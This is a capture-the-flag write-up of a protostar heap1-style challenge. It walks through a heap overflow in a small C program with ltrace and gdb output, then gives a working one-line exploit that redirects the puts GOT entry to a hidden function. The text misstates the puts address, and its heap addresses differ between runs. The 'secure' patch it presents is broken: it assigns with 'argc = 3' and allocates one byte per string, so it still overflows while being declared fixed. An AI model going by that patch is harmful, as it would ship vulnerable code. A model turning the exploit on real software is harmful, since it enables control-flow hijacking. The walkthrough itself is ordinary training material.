This challenge is based off of a challenge from protostar (heap1 to be exact).

Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct space	
{
	char* star; 
};

void endless()
{
	int i = 5;
	printf("Do you know how much research I could fit in space? I'll give you a hint, more than %d. Level Cleared\n", i);
}

int main(int argc, char **argv)
{
	if (argc != 3)
	{
		puts("You need two arguments in addition to the elf's name to research this.\n");
		exit(0);
	}
	struct space *sun, *moon;

	sun = malloc(sizeof(struct space));
	sun->star = malloc(10);

	moon = malloc(sizeof(struct space));
	moon->star = malloc(10);

	strcpy(sun->star, argv[1]);
	strcpy(moon->star, argv[2]);
	
	puts("Do you know what well rounded researchers like? They like space.\n");
}
```

So looking at this code, we can see a heap overflow vulnerabillity. It checks to make sure that the program takes three arguments (two arguments plus the name), then proceeds to copy the two arguments over to a place allocated in the heap via a malloc call. However it doesn't check to see how much data the strcpy calls are writing. The two places in memory that it is copying to have a static size of 10 bytes set. So we should the heap. 

We can see that in order to pwn this challenge, we have to run the endless() function. We see that we have the abillity to write twice to the heap, using addresses that point towards the heap. What we can do is overflow sun->star (like a buffer overflow) to overwrite the address of moon->star with that of the puts function using the first strcpy function. This way the second strcpy function would write over the address with an address that we want (such as the address of the endless function). Then when the program tries to run the puts function, it will just end up running whatever is stored at the addres we want. Let's find the offset, using a utillity called ltrace.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1$ ltrace ./h1 0000 1111
__libc_start_main(0x80484ce, 3, 0xffffd0f4, 0x80485a0 <unfinished ...>
malloc(4)                                        = 0x804a008
malloc(10)                                       = 0x804a018
malloc(4)                                        = 0x804a028
malloc(10)                                       = 0x804a038
strcpy(0x804a018, "0000")                        = 0x804a018
strcpy(0x804a038, "1111")                        = 0x804a038
puts("Do you know what well rounded re"...Do you know what well rounded researchers like? They like space.

)      = 66
+++ exited (status 0) +++
```

So we can see here that our input is being stored at 0x804a018 with the first strcpy, and to 0x804a038 using the second strcoy. We can see here that there are four allocated places in the heap memory, one for each malloc call. We can see that the spaces at 0x804a008 and 0x804a028 only contain 4 bytes worth of data. This is because the size parameter that is handed to them is the size of the space struct, which the space struct only contains a pointer to a char (which is just an address pointing to a space) and addresses in 32 bit systems are 4 bytes long. So the only thing the sun and moon iterations of the space struct contain are a 4 byte address pointer. We also see that the pointers sun->space and moon-> space have 10 bytes allocated to them via a malloc call. Because of those malloc calls those pointers actually point to allocated space now. 

Also notice how the heap spaces outputted by the ltrace command match the order that the heap space is allocated via malloc calls in the program. This isn't a coincidence. When allocating space in the heap via malloc calls, the order of the spaces is determined by the order that the malloc calls are made. Now we made a lot of claims here, let's prove some of them using gdb. We will set a breakpoint for the printf (compiler changed it to puts) call in main (exact location shouldn't matter as long as it's past the corresponding malloc calls), and analyze the corresponding addresses to determine that sun->star and moon->star both contain a pointer to a memory address (which will be 0x804a018 for sun->star and 0x804a038 for moon->star). Also that the memory areas they point to contain our input.

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080484ee <+0>:	lea    ecx,[esp+0x4]
   0x080484f2 <+4>:	and    esp,0xfffffff0
   0x080484f5 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484f8 <+10>:	push   ebp
   0x080484f9 <+11>:	mov    ebp,esp
   0x080484fb <+13>:	push   ebx
   0x080484fc <+14>:	push   ecx
   0x080484fd <+15>:	sub    esp,0x10
   0x08048500 <+18>:	mov    ebx,ecx
   0x08048502 <+20>:	cmp    DWORD PTR [ebx],0x3
   0x08048505 <+23>:	je     0x8048521 <main+51>
   0x08048507 <+25>:	sub    esp,0xc
   0x0804850a <+28>:	push   0x80486a8
   0x0804850f <+33>:	call   0x8048390 <puts@plt>
   0x08048514 <+38>:	add    esp,0x10
   0x08048517 <+41>:	sub    esp,0xc
   0x0804851a <+44>:	push   0x0
   0x0804851c <+46>:	call   0x80483a0 <exit@plt>
   0x08048521 <+51>:	sub    esp,0xc
   0x08048524 <+54>:	push   0x4
   0x08048526 <+56>:	call   0x8048380 <malloc@plt>
   0x0804852b <+61>:	add    esp,0x10
   0x0804852e <+64>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048531 <+67>:	sub    esp,0xc
   0x08048534 <+70>:	push   0xa
   0x08048536 <+72>:	call   0x8048380 <malloc@plt>
   0x0804853b <+77>:	add    esp,0x10
   0x0804853e <+80>:	mov    edx,eax
   0x08048540 <+82>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048543 <+85>:	mov    DWORD PTR [eax],edx
   0x08048545 <+87>:	sub    esp,0xc
   0x08048548 <+90>:	push   0x4
   0x0804854a <+92>:	call   0x8048380 <malloc@plt>
   0x0804854f <+97>:	add    esp,0x10
   0x08048552 <+100>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048555 <+103>:	sub    esp,0xc
   0x08048558 <+106>:	push   0xa
   0x0804855a <+108>:	call   0x8048380 <malloc@plt>
   0x0804855f <+113>:	add    esp,0x10
   0x08048562 <+116>:	mov    edx,eax
   0x08048564 <+118>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08048567 <+121>:	mov    DWORD PTR [eax],edx
   0x08048569 <+123>:	mov    eax,DWORD PTR [ebx+0x4]
   0x0804856c <+126>:	add    eax,0x4
   0x0804856f <+129>:	mov    edx,DWORD PTR [eax]
   0x08048571 <+131>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048574 <+134>:	mov    eax,DWORD PTR [eax]
   0x08048576 <+136>:	sub    esp,0x8
   0x08048579 <+139>:	push   edx
   0x0804857a <+140>:	push   eax
   0x0804857b <+141>:	call   0x8048370 <strcpy@plt>
   0x08048580 <+146>:	add    esp,0x10
   0x08048583 <+149>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048586 <+152>:	add    eax,0x8
   0x08048589 <+155>:	mov    edx,DWORD PTR [eax]
   0x0804858b <+157>:	mov    eax,DWORD PTR [ebp-0x10]
   0x0804858e <+160>:	mov    eax,DWORD PTR [eax]
   0x08048590 <+162>:	sub    esp,0x8
   0x08048593 <+165>:	push   edx
   0x08048594 <+166>:	push   eax
   0x08048595 <+167>:	call   0x8048370 <strcpy@plt>
   0x0804859a <+172>:	add    esp,0x10
   0x0804859d <+175>:	sub    esp,0xc
   0x080485a0 <+178>:	push   0x80486f0
   0x080485a5 <+183>:	call   0x8048390 <puts@plt>
   0x080485aa <+188>:	add    esp,0x10
   0x080485ad <+191>:	mov    eax,0x0
   0x080485b2 <+196>:	lea    esp,[ebp-0x8]
   0x080485b5 <+199>:	pop    ecx
   0x080485b6 <+200>:	pop    ebx
   0x080485b7 <+201>:	pop    ebp
   0x080485b8 <+202>:	lea    esp,[ecx-0x4]
   0x080485bb <+205>:	ret    
End of assembler dump.
gdb-peda$ b *main+183
Breakpoint 1 at 0x80485a5
gdb-peda$ r 7539 9517
```

One wall of text later...

```
Breakpoint 1, 0x080485a5 in main ()
gdb-peda$ x/w 0x804b008
0x804b008:	U"\x804b018"
gdb-peda$ x/s 0x804b018
0x804b018:	"7539"
gdb-peda$ x/w 0x804b028
0x804b028:	U"\x804b038"
gdb-peda$ x/s 0x804b038
0x804b038:	"9517"
```

So as you can see there, we showed that the spaces 0x804b008 and 0x804b028 contain pointers to spaces at 0x804b018 and 0x804b038 which contain our input. So for this exploit we will simply use the first strcpy to overflow the memory starting at 0x804b018 to overwrite the pointer stored at 0x804b028 of some other address, then we can rewrite the address with the second strcpy call to that of the endless function so we can pwn the challenge. Looking at the code, we see a call to printf after our two strcpy functions however looking at the assembly we can see that it is calling something else.

```
   0x080485a5 <+183>:	call   0x8048390 <puts@plt>
```

Even though we have in our code to call the printf function, we are just printing text. We aren't printing any chars, pointers, integers or anything else. Since we aren't the compiler will just substitue in puts instead of printf, since puts is a simpler version of printf and will do it's job just fine. This actually works in our advantage since in the endless function, that printf call is actually printing an int. So the compiler will use printf instead of puts, so we won't run into an issue with trying to run a function that we overwritten to call the endless function and enter a loop that ends with the program crashing.

```
gdb-peda$ disas endless
Dump of assembler code for function endless:
   0x080484cb <+0>:	push   ebp
   0x080484cc <+1>:	mov    ebp,esp
   0x080484ce <+3>:	sub    esp,0x18
   0x080484d1 <+6>:	mov    DWORD PTR [ebp-0xc],0x5
   0x080484d8 <+13>:	sub    esp,0x8
   0x080484db <+16>:	push   DWORD PTR [ebp-0xc]
   0x080484de <+19>:	push   0x8048640
   0x080484e3 <+24>:	call   0x8048360 <printf@plt>
   0x080484e8 <+29>:	add    esp,0x10
   0x080484eb <+32>:	nop
   0x080484ec <+33>:	leave  
   0x080484ed <+34>:	ret    
End of assembler dump.
```

As you can see there, my previous claim held true. Now the first step is figuring out the offset between the start of our input, and where the moon->star pointer is stored. Then we will have to come up with the address of puts, and endless. 

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1$ python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x804b028 - 0x804b018
16
>>> exit()
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1$ objdump -R h1 | grep puts
0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1$ objdump -D h1 | grep endless
080484cb <endless>:
```

So we have the offset which is 16, the address of puts which is 0x0804a01c, and the address of endless which is 0x080484cb. Now to craft the exploit to overflow the address (remember we have to push the hex strings using little endian still).

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1$ ./h1 `python -c 'print "0"*16 + "\x18\xa0\x04\x08" + " " + "\xcb\x84\x04\x08"'`
Do you know how much research I could fit in space? I'll give you a hint, more than 5. Level Cleared
```

Just like that we pwned the binary. Now to patch it.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1$ cat h1_secure.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct space	
{
	char* star; 
};

void endless()
{
	int i = 5;
	printf("Do you know how much research I could fit in space? I'll give you a hint, more than %d. Level Cleared\n", i);
}

int main(int argc, char **argv)
{
	if (argc != 3)
	{
		puts("You need two arguments in addition to the elf's name to research this.\n");
		exit(0);
	}
	if (argc = 3)
	{
		if (strlen(argv[1]) > 9)
		{
			printf("Inputs must be less than 10 characters.\n");
			exit(0);
		}
		
		if (strlen(argv[2]) > 9)
		{
			printf("Inputs must be less than 10 characters.\n");
			exit(0);
		}
		
	}
	struct space *sun, *moon;

	sun = malloc(sizeof(struct space));
	sun->star = malloc(sizeof(*argv[1]));

	moon = malloc(sizeof(struct space));
	moon->star = malloc(sizeof(*argv[2]));

	strcpy(sun->star, argv[1]);
	strcpy(moon->star, argv[2]);

	printf("Do you know what well rounded researchers like? They like space.\n");
}
```

As you can see, we addres additional checks that will confirm that our input will at it's most will still be smaller than the allocated space. This way an attacker should not be able to input enough data for an overflow. Let's test it.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1$ ./h1_secure 0000000000000000000000000000000000000000000000000000000000000000000000 1111
Inputs must be less than 10 characters.
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1$ ./h1_secure 0000 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Inputs must be less than 10 characters.
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1$ ./h1_secure 0000000000000000000000000000000000000000000000000000000000000000000000000000000000 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Inputs must be less than 10 characters.
```

Just like that we patched the binary...
